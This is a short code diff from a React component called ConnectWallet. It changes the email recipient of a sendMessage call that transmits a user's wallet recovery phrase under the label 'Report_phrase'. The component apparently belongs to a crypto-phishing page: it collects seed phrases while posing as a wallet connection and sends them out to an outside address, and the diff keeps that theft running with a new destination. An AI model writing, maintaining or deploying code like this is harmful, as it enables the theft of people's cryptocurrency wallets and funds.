@@ -99,7 +99,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "trustpayd@gmail.com"
+        "support@apexmetagroup"
       )
         .then(() => {
           setValue({
